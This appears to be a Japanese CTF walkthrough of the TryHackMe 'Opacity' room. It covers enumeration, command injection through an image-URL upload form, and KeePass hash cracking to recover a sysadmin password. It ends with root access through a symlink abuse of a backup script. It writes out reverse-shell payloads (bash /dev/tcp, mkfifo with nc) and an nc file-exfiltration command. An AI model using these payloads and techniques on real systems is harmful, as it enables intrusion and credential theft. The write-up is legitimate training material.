# Opacity CTF

https://tryhackme.com/r/room/opacity

## Enumeration

### ポートスキャン

```shell
TARGET=10.10.141.52
root@ip-10-10-168-113:~# sudo nmap -sS -p- $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-01-21 05:09 GMT
Nmap scan report for 10.10.141.52
Host is up (0.0051s latency).
Not shown: 65531 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
MAC Address: 02:80:2A:F4:CF:ED (Unknown)

root@ip-10-10-168-113:~# sudo nmap -sV -p22,80,139,445 $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-01-21 05:10 GMT
Nmap scan report for 10.10.141.52
Host is up (0.00040s latency).

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
MAC Address: 02:80:2A:F4:CF:ED (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

SSH, HTTP, SMB

ホームページは何かのログイン画面。

## SMB

```shell
$ enum4linux -S 10.10.141.52
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Tue Jan 21 00:45:58 2025

 =========================================( Target Information )=========================================

Target ........... 10.10.141.52
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ============================( Enumerating Workgroup/Domain on 10.10.141.52 )============================


[+] Got domain/workgroup name: WORKGROUP


 ===================================( Session Check on 10.10.141.52 )===================================


[+] Server 10.10.141.52 allows sessions using username '', password ''


 ================================( Getting domain SID for 10.10.141.52 )================================

Domain Name: WORKGROUP
Domain Sid: (NULL SID)

[+] Can't determine if host is part of domain or part of a workgroup


 =================================( Share Enumeration on 10.10.141.52 )=================================

smbXcli_negprot_smb1_done: No compatible protocol selected by server.

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        IPC$            IPC       IPC Service (opacity server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.
Protocol negotiation to server 10.10.141.52 (for a protocol between LANMAN1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on 10.10.141.52

//10.10.141.52/print$   Mapping: DENIED Listing: N/A Writing: N/A

[E] Can't understand response:

NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*
//10.10.141.52/IPC$     Mapping: N/A Listing: N/A Writing: N/A
enum4linux complete on Tue Jan 21 00:46:13 2025
```

### gobuster

```shell
root@ip-10-10-168-113:~# gobuster dir -u http://$TARGET -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.141.52
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/css                  (Status: 301) [Size: 310] [--> http://10.10.141.52/css/]
/cloud                (Status: 301) [Size: 312] [--> http://10.10.141.52/cloud/]
/server-status        (Status: 403) [Size: 277]
Progress: 220557 / 220558 (100.00%)
===============================================================
Finished
===============================================================

root@ip-10-10-168-113:~# gobuster dir -u http://$TARGET -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -t 30
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.141.52
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/cloud                (Status: 301) [Size: 312] [--> http://10.10.141.52/cloud/]
/css                  (Status: 301) [Size: 310] [--> http://10.10.141.52/css/]
/server-status        (Status: 403) [Size: 277]
Progress: 20473 / 20474 (100.00%)
===============================================================
Finished
===============================================================
```

## /cloud

/cloud はファイルアップロード画面。

kali 上で Web サーバーを起動し、外部 URL を指定してアップロード

```text
http://10.2.22.182:8888/kurasiki.jpg
↓
http://10.10.141.52/cloud/images/kurasiki.jpg
```

同じ画像で拡張子だけ変える。

```text
http://10.2.22.182:8888/test1.aaaaa
↓
Please select an image
```

拡張子によるホワイトリストフィルターが存在すると考えられる。

```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.2.22.182/1234 0>&1'") ?>
```

php を shell.jpg として保存する。

```text
http://10.2.22.182:8888/shell.jpg
↓
アップロード成功したような動作になるが、実際にはアップロードされていない。
```

```text
http://10.10.141.52/cloud/images/shell.php.jpg
↓
アップロード成功したような動作になるが、実際にはアップロードされていない。
```

```text
http://10.10.141.52/cloud/images/shell.jpg.php
↓
Please select an image
```

```text
先頭6バイトを「47 49 46 38 37 61」にしてGIFを偽装
↓
アップロード成功したような動作になるが、実際にはアップロードされていない。
```

```text
http://10.2.22.182:8888/shell.php?aaa.jpg
↓
アップロード成功したような動作になるが、実際にはアップロードされていない。
```

- URL の最後が画像の拡張子であれば、HTTP GET は実行される。
- 拡張子とマジックナンバーを偽装しても、実際に保存はされない。

nc でリクエストの詳細を確認すると、wget で取得していることが分かった。  
つまり、弱点は PHP アップロードではなく、コマンドインジェクションだった。

```shell
$ nc -lvnp 8888
listening on [any] 8888 ...
connect to [10.2.22.182] from (UNKNOWN) [10.10.141.52] 35842
GET /magic-gif.gif HTTP/1.1
User-Agent: Wget/1.20.3 (linux-gnu)
Accept: */*
Accept-Encoding: identity
Host: 10.2.22.182:8888
Connection: Keep-Alive
```

## リバースシェル

画像 URL として下記を指定

```text
; rm /tmp/f; mkfifo /tmp/f; nc 10.2.22.182 1234 < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f; echo aaa.jpg
```

```shell
$ nc -lvnp 1234

whoami
www-data
ls /home
sysadmin
ls -al /home
total 12
drwxr-xr-x  3 root     root     4096 Jul 26  2022 .
drwxr-xr-x 19 root     root     4096 Jul 26  2022 ..
drwxr-xr-x  6 sysadmin sysadmin 4096 Feb 22  2023 sysadmin
ls -al /home/sysadmin
total 44
drwxr-xr-x 6 sysadmin sysadmin 4096 Feb 22  2023 .
drwxr-xr-x 3 root     root     4096 Jul 26  2022 ..
-rw------- 1 sysadmin sysadmin   22 Feb 22  2023 .bash_history
-rw-r--r-- 1 sysadmin sysadmin  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 sysadmin sysadmin 3771 Feb 25  2020 .bashrc
drwx------ 2 sysadmin sysadmin 4096 Jul 26  2022 .cache
drwx------ 3 sysadmin sysadmin 4096 Jul 28  2022 .gnupg
-rw-r--r-- 1 sysadmin sysadmin  807 Feb 25  2020 .profile
drwx------ 2 sysadmin sysadmin 4096 Jul 26  2022 .ssh
-rw-r--r-- 1 sysadmin sysadmin    0 Jul 28  2022 .sudo_as_admin_successful
-rw------- 1 sysadmin sysadmin   33 Jul 26  2022 local.txt
drwxr-xr-x 3 root     root     4096 Jul  8  2022 scripts
```

local.txt を発見したが、sysadmin にしか開けない。

```shell
ls -al /home/sysadmin/scripts
total 16
drwxr-xr-x 3 root     root     4096 Jul  8  2022 .
drwxr-xr-x 6 sysadmin sysadmin 4096 Feb 22  2023 ..
drwxr-xr-x 2 sysadmin root     4096 Jul 26  2022 lib
-rw-r----- 1 root     sysadmin  519 Jul  8  2022 script.php
```

これはたぶん、root 昇格絡み。

sysadmin 所有ファイル

```shell
find / -user sysadmin -type f 2>/dev/null
/opt/dataset.kdbx
/home/sysadmin/.sudo_as_admin_successful
/home/sysadmin/.bash_history
/home/sysadmin/local.txt
/home/sysadmin/.bashrc
/home/sysadmin/.bash_logout
/home/sysadmin/.profile

file /opt/dataset.kdbx
/opt/dataset.kdbx: Keepass password database 2.x KDBX
```

keepass ファイルを発見

## Keepass

ファイルダウンロード

```shell
# 先にサーバーでリッスン
nc -nlvp 12345 < /opt/dataset.kdbx

# 後でkaliから接続
nc 10.10.141.52 12345 > dataset.kdbx
```

パスワードをクラック

```shell
$ keepass2john ./dataset.kdbx > ./hash.txt

hashcat -m 13400 hash.txt .\SecLists\Passwords\Common-Credentials\10-million-password-list-top-1000000.txt
 .....
200fc1c2494baf7c28b7486f081a82e935411ab72a27736b4:741852963
```

パスワードが割れた。741852963  
オープン。

```shell
$ keepassxc-cli open ./dataset.kdbx
Enter password to unlock ./dataset.kdbx:
dataset.kdbx> ls
user:password
dataset.kdbx> show user:password
Title: user:password
UserName: sysadmin
Password: PROTECTED
URL:
Notes:
Uuid: {c116cbb5-f7c3-9a74-04c2-75019b28cc51}
Tags:
dataset.kdbx> show --show-protected user:password
Title: user:password
UserName: sysadmin
Password: Cl0udP4ss40p4city#8700
URL:
Notes:
Uuid: {c116cbb5-f7c3-9a74-04c2-75019b28cc51}
Tags:
dataset.kdbx>
```

## SSH

このパスワードで SSH でログインできた。

```shell
sysadmin@opacity:~$ cat local.txt
6661......
```

フラグ１ゲット

```shell
sysadmin@opacity:~$ ls -al ./scripts
total 16
drwxr-xr-x 3 root     root     4096 Jul  8  2022 .
drwxr-xr-x 6 sysadmin sysadmin 4096 Feb 22  2023 ..
drwxr-xr-x 2 sysadmin root     4096 Jul 26  2022 lib
-rw-r----- 1 root     sysadmin  519 Jul  8  2022 script.php

sysadmin@opacity:~$ cat ./scripts/script.php
<?php

//Backup of scripts sysadmin folder
require_once('lib/backup.inc.php');
zipData('/home/sysadmin/scripts', '/var/backups/backup.zip');
echo 'Successful', PHP_EOL;

//Files scheduled removal
$dir = "/var/www/html/cloud/images";
if(file_exists($dir)){
    $di = new RecursiveDirectoryIterator($dir, FilesystemIterator::SKIP_DOTS);
    $ri = new RecursiveIteratorIterator($di, RecursiveIteratorIterator::CHILD_FIRST);
    foreach ( $ri as $file ) {
        $file->isDir() ?  rmdir($file) : unlink($file);
    }
}
?>
```

/home/sysadmin/scripts を丸ごと zip でバックアップするスクリプト。  
scripts/lib は書き込みできるので、/root へのシンボリックリンクを作ればよいのではないか？

```shell
sysadmin@opacity:~/scripts/lib$ ln -s /root root
sysadmin@opacity:~/scripts/lib$ ls -al
total 132
drwxr-xr-x 2 sysadmin root      4096 Jan 21 08:13 .
drwxr-xr-x 3 root     root      4096 Jul  8  2022 ..
-rw-r--r-- 1 root     root      9458 Jul 26  2022 application.php
-rw-r--r-- 1 root     root       967 Jul  6  2022 backup.inc.php
-rw-r--r-- 1 root     root     24514 Jul 26  2022 bio2rdfapi.php
-rw-r--r-- 1 root     root     11222 Jul 26  2022 biopax2bio2rdf.php
-rw-r--r-- 1 root     root      7595 Jul 26  2022 dataresource.php
-rw-r--r-- 1 root     root      4828 Jul 26  2022 dataset.php
-rw-r--r-- 1 root     root      3243 Jul 26  2022 fileapi.php
-rw-r--r-- 1 root     root      1325 Jul 26  2022 owlapi.php
-rw-r--r-- 1 root     root      1465 Jul 26  2022 phplib.php
-rw-r--r-- 1 root     root     10548 Jul 26  2022 rdfapi.php
-rw-r--r-- 1 root     root     16469 Jul 26  2022 registry.php
lrwxrwxrwx 1 sysadmin sysadmin     5 Jan 21 08:13 root -> /root
-rw-r--r-- 1 root     root      6862 Jul 26  2022 utils.php
-rwxr-xr-x 1 root     root      3921 Jul 26  2022 xmlapi.php
```

空の root ディレクトリがバックアップされたので、ファイル名指定でリンクを作る。

```shell
sysadmin@opacity:~/scripts/lib$ ln -s /root/proof.txt proof.txt
sysadmin@opacity:~/scripts/lib$ ls -al
total 132
drwxr-xr-x 2 sysadmin root      4096 Jan 21 08:20 .
drwxr-xr-x 3 root     root      4096 Jul  8  2022 ..
-rw-r--r-- 1 root     root      9458 Jul 26  2022 application.php
-rw-r--r-- 1 root     root       967 Jul  6  2022 backup.inc.php
-rw-r--r-- 1 root     root     24514 Jul 26  2022 bio2rdfapi.php
-rw-r--r-- 1 root     root     11222 Jul 26  2022 biopax2bio2rdf.php
-rw-r--r-- 1 root     root      7595 Jul 26  2022 dataresource.php
-rw-r--r-- 1 root     root      4828 Jul 26  2022 dataset.php
-rw-r--r-- 1 root     root      3243 Jul 26  2022 fileapi.php
-rw-r--r-- 1 root     root      1325 Jul 26  2022 owlapi.php
-rw-r--r-- 1 root     root      1465 Jul 26  2022 phplib.php
lrwxrwxrwx 1 sysadmin sysadmin    15 Jan 21 08:20 proof.txt -> /root/proof.txt
-rw-r--r-- 1 root     root     10548 Jul 26  2022 rdfapi.php
-rw-r--r-- 1 root     root     16469 Jul 26  2022 registry.php
-rw-r--r-- 1 root     root      6862 Jul 26  2022 utils.php
-rwxr-xr-x 1 root     root      3921 Jul 26  2022 xmlapi.php
```

開く

```shell
sysadmin@opacity:~/tmp$ unzip ./backup.zip
Archive:  ./backup.zip
   creating: lib/
warning:  stripped absolute path spec from /root/
   creating: root/
  inflating: script.php
  inflating: lib/backup.inc.php
  inflating: lib/phplib.php
  inflating: lib/owlapi.php
  inflating: lib/fileapi.php
  inflating: lib/application.php
  inflating: lib/utils.php
warning:  stripped absolute path spec from /root/proof.txt
 extracting: root/proof.txt
  inflating: lib/dataset.php
  inflating: lib/dataresource.php
  inflating: lib/registry.php
  inflating: lib/bio2rdfapi.php
  inflating: lib/rdfapi.php
  inflating: lib/biopax2bio2rdf.php
  inflating: lib/xmlapi.php

sysadmin@opacity:~/tmp$ ls root
proof.txt

sysadmin@opacity:~/tmp$ cat root/proof.txt
ac0d56......
```

ルートフラグゲット

## 振り返り

- ホームページのログイン画面と SMB は罠。Opacity という名前で SMB との関連を示唆しているので、何かあると思ったが。何か隠されているのだろうか。
- SSRF の ファイルダウンロード方法を HTTP ヘッダーから推測するのは目から鱗
- keepass は完全に初見だったので、使い方を学べて良かった
- 他の人のウォークスルーを見たら、backup.inc.php をリバースシェルに変更して root シェルを取得していた。ファイルの Write 権限はないが、ファイル削除と新規作成は可能なので確かにそれも可能。
